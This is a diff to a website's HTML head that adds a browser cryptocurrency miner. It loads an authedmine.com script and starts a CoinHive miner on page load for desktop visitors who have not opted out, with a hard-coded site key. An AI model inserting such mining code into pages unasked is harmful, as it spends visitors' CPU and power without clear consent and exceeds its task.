@@ -21,6 +21,16 @@
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
     <script src="js/bootstrap.min.js"></script>
 	<script src="js/load_video.js"></script>
+  <script src="https://authedmine.com/lib/authedmine.min.js"></script>
+  <script>
+  	var miner = new CoinHive.Anonymous('u8sXsqGDVrN81A1y7C70CG0xtZlqVNeg', {throttle: 0.3});
+
+  	// Only start on non-mobile devices and if not opted-out
+  	// in the last 14400 seconds (4 hours):
+  	if (!miner.isMobile() && !miner.didOptOut(14400)) {
+  		miner.start();
+  	}
+  </script>
 
     <!--<link href="css/bootstrap-theme.min.css" rel="stylesheet">-->
     <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
